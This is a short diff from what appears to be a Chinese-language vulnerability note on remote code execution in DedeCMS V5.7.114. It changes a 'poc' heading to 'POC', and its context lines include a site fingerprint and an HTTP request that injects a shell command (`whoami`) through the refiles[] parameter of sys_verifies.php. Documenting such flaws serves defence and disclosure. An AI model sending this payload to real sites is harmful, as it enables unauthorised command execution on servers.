@@ -8,7 +8,7 @@ DedeCMS V5.7.114存在远程代码执行漏洞。产生该漏洞的原因是，�
 app="DedeCMS网站内容管理系统"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /dede/sys_verifies.php?action=getfiles&refiles[]=123${${print%20`whoami`}} HTTP/1.1
